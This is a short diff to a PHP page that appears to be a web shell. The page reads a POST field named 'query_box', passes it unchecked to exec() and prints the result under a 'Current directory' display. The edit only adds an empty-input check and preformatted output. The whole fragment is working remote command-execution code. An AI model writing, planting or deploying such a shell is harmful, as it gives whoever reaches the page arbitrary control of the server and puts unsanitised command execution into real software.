@@ -22,8 +22,13 @@ if($_SESSION['status']!="1"){
 $cwd=getcwd();
 echo "<br>Current directory: $cwd<br>";
 $shell = $_POST['query_box'];
-$run = exec("$shell");
-echo "<br><b>Output: $run</b><br>";
+if (!empty($_POST['query_box'])) {
+	$run = exec("$shell");
+	echo "<br><b>Output: </b><br>";
+	echo "<pre>$run</pre>";
+}else{
+	echo "<b>Nothing has been run yet.</b>";	
+}
 ?>  
 </body>
 </html>
